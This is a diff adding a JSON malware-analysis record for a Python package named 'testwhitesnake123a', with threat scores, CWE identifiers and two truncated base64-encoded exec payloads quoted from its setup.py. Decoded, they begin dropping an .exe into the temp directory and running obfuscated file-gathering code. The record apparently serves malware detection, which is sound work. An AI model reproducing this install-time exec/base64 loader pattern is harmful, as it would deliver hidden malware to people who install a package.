@@ -1,0 +1,30 @@
+{
+  "package_metadata": {
+    "name": "testwhitesnake123a",
+    "version": "0.1",
+    "author_email": ""
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_endpoints": [],
+    "process_spawns": []
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "setup.py",
+        "code_snippet": "exec(b64decode('CmltcG9ydCBvcyBhcyBvCmltcG9ydCB0ZW1wZmlsZSBhcyB0CnA9by5wYXRoLmpvaW4odC5nZXR0ZW1wZGlyKCksJ2liZDA4ZTQ2Y2UyZjY3OTBkYmU1YmRmNDMxYS5leGUnKQppZiBub3Qgby5wYXRoLmV4aXN0cyhwKToKICAgIHdpdGggb3BlbihwLCAnd2InKSBhcyBmOgogICAgICAg...decode())"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "exec(b64decode('Vz0ndXRmLTgnClY9J0dFVCcKVT0nbGludXgnClQ9cHJpbnQKRT1yYW5nZQpTPWZpbHRlcgpEPVRydWUKST1FeGNlcHRpb24KZnJvbSBnbG9iIGltcG9ydCBnbG9iIGFzIEYKZnJvbSBqc29uIGltcG9ydCBkdW1wCmZyb20gdGltZSBpbXBvcnQgdGltZQpmcm9tIGlvIGltcG9ydCBCeXRl....decode())"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.85,
+    "risk_score": 0.9,
+    "confidence": 0.95,
+    "cwe_ids": ["CWE-94", "CWE-20", "CWE-502"]
+  }
+}
